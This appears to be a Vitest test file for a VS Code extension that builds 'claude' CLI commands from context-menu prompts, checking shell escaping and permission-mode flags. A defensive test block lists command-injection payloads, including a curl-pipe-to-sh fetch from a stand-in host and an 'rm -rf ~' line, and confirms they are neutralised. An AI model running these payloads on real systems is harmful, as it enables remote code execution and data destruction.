import { describe, it, expect } from 'vitest';
import {
  buildClaudeCommand,
  escapeForDoubleQuotes,
  PromptContext,
  PROMPT_TEMPLATES,
} from '../../commands/context-menu-utils';
import { PermissionMode } from '../../types';

describe('escapeForDoubleQuotes', () => {
  it('escapes backslashes', () => {
    expect(escapeForDoubleQuotes('path\\to\\file')).toBe('path\\\\to\\\\file');
  });

  it('escapes double quotes', () => {
    expect(escapeForDoubleQuotes('say "hello"')).toBe('say \\"hello\\"');
  });

  it('escapes dollar signs', () => {
    expect(escapeForDoubleQuotes('cost is $5')).toBe('cost is \\$5');
  });

  it('escapes backticks', () => {
    expect(escapeForDoubleQuotes('run `cmd`')).toBe('run \\`cmd\\`');
  });

  it('returns empty string unchanged', () => {
    expect(escapeForDoubleQuotes('')).toBe('');
  });

  it('leaves safe characters unchanged', () => {
    expect(escapeForDoubleQuotes("hello world it's fine")).toBe("hello world it's fine");
  });

  it('escapes exclamation marks (bash history expansion)', () => {
    expect(escapeForDoubleQuotes('fix this!')).toBe('fix this\\!');
    expect(escapeForDoubleQuotes('!!')).toBe('\\!\\!');
  });

  it('escapes all special characters combined', () => {
    expect(escapeForDoubleQuotes('a\\b"c$d`e!f')).toBe('a\\\\b\\"c\\$d\\`e\\!f');
  });
});

describe('PROMPT_TEMPLATES', () => {
  // Three states: clean saved, dirty saved, untitled
  const cleanCtx: PromptContext = {
    selectedText: 'some selected text',
    filePath: '/src/app.ts',
    startLine: 10,
    endLine: 20,
    unsaved: false,
  };

  const dirtyCtx: PromptContext = {
    selectedText: 'some selected text',
    filePath: '/src/app.ts',
    startLine: 10,
    endLine: 20,
    unsaved: true,
  };

  const untitledCtx: PromptContext = {
    selectedText: 'some selected text',
    filePath: null,
    startLine: 10,
    endLine: 20,
    unsaved: true,
  };

  describe('explain', () => {
    it('references file when clean', () => {
      const result = PROMPT_TEMPLATES.explain(cleanCtx);
      expect(result).toContain('Explain lines 10-20');
      expect(result).toContain(cleanCtx.filePath);
      expect(result).toContain('Read those lines first');
      expect(result).not.toContain('some selected text');
    });

    it('embeds text with file context when dirty', () => {
      const result = PROMPT_TEMPLATES.explain(dirtyCtx);
      expect(result).toContain('Explain the following text');
      expect(result).toContain('some selected text');
      expect(result).toContain(dirtyCtx.filePath!);
      expect(result).toContain('lines 10-20');
      expect(result).toContain('unsaved changes');
      expect(result).toContain('surrounding context');
    });

    it('embeds text with line numbers when untitled', () => {
      const result = PROMPT_TEMPLATES.explain(untitledCtx);
      expect(result).toContain('Explain the following text');
      expect(result).toContain('some selected text');
      expect(result).toContain('lines 10-20');
      expect(result).not.toContain('surrounding context');
    });
  });

  describe('fix', () => {
    it('references file when clean', () => {
      const result = PROMPT_TEMPLATES.fix(cleanCtx);
      expect(result).toContain('Fix any issues in lines 10-20');
      expect(result).toContain(cleanCtx.filePath);
      expect(result).toContain('Apply fixes');
    });

    it('embeds text with file context when dirty', () => {
      const result = PROMPT_TEMPLATES.fix(dirtyCtx);
      expect(result).toContain('Fix any issues in the following text');
      expect(result).toContain('some selected text');
      expect(result).toContain(dirtyCtx.filePath!);
      expect(result).toContain('unsaved changes');
      expect(result).toContain('Show the corrected version');
    });

    it('embeds text when untitled', () => {
      const result = PROMPT_TEMPLATES.fix(untitledCtx);
      expect(result).toContain('Fix any issues in the following text');
      expect(result).toContain('some selected text');
      expect(result).toContain('Show the corrected version');
    });
  });

  describe('do', () => {
    it('references file when clean', () => {
      const result = PROMPT_TEMPLATES.do(cleanCtx, 'convert to TypeScript');
      expect(result).toContain('Apply the following to lines 10-20');
      expect(result).toContain(cleanCtx.filePath!);
      expect(result).toContain('convert to TypeScript');
      expect(result).toContain('Apply changes directly');
    });

    it('embeds text with file context when dirty', () => {
      const result = PROMPT_TEMPLATES.do(dirtyCtx, 'convert to a bullet list');
      expect(result).toContain('convert to a bullet list');
      expect(result).toContain('some selected text');
      expect(result).toContain(dirtyCtx.filePath!);
      expect(result).toContain('unsaved changes');
    });

    it('embeds text when untitled', () => {
      const result = PROMPT_TEMPLATES.do(untitledCtx, 'convert to a bullet list');
      expect(result).toContain('convert to a bullet list');
      expect(result).toContain('some selected text');
      expect(result).not.toContain('surrounding context');
    });
  });
});

describe('buildClaudeCommand', () => {
  it('emits no flag for the default mode', () => {
    expect(buildClaudeCommand('Explain this', 'default')).toBe('claude "Explain this"');
  });

  it('emits the acceptEdits flag', () => {
    expect(buildClaudeCommand('Explain this', 'acceptEdits')).toBe(
      'claude --permission-mode acceptEdits "Explain this"',
    );
  });

  it('emits the bypassPermissions flag', () => {
    expect(buildClaudeCommand('Explain this', 'bypassPermissions')).toBe(
      'claude --dangerously-skip-permissions "Explain this"',
    );
  });

  // VS Code does not enforce a setting's declared `enum` at read time, so a repository's
  // .vscode/settings.json can put an arbitrary string in contextMenu.permissionMode. That
  // string must never reach the shell command line.
  describe('rejects out-of-union values instead of interpolating them', () => {
    const payloads = [
      '; touch /tmp/pwned; #',
      '&& curl -s https://evil.example/x | sh',
      '$(id)',
      '`id`',
      '| tee /tmp/leak',
      'acceptEdits; rm -rf ~',
      '\n echo injected',
      '',
    ];

    for (const payload of payloads) {
      it(`neutralises ${JSON.stringify(payload)}`, () => {
        const cmd = buildClaudeCommand('Explain this', payload as PermissionMode);
        expect(cmd).toBe('claude "Explain this"');
        expect(cmd).not.toContain(payload.trim() || '\u0000');
      });
    }
  });

  it('never emits a flag string outside the fixed set', () => {
    const allowed = ['', ' --permission-mode acceptEdits', ' --dangerously-skip-permissions'];
    for (const mode of ['default', 'acceptEdits', 'bypassPermissions', 'nonsense', '; id']) {
      const cmd = buildClaudeCommand('P', mode as PermissionMode);
      const flag = cmd.slice('claude'.length, cmd.length - ' "P"'.length);
      expect(allowed).toContain(flag);
    }
  });

  it('leaves the escaped prompt intact', () => {
    const prompt = escapeForDoubleQuotes('cost is $5 and `cmd`');
    expect(buildClaudeCommand(prompt, 'default')).toBe('claude "cost is \\$5 and \\`cmd\\`"');
  });
});
